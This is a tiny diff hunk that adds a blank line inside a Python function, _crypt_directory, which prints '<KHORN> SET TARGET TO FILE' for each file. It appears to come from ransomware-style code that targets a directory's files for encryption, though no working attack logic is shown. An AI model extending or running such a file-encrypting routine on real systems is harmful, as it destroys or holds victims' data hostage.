@@ -58,6 +58,7 @@ def _crypt_directory(directory):
             continue
 
         print(f'<KHORN> SET TARGET TO FILE: {name_file}')
+
         res[name_file] = ''
 
         try:
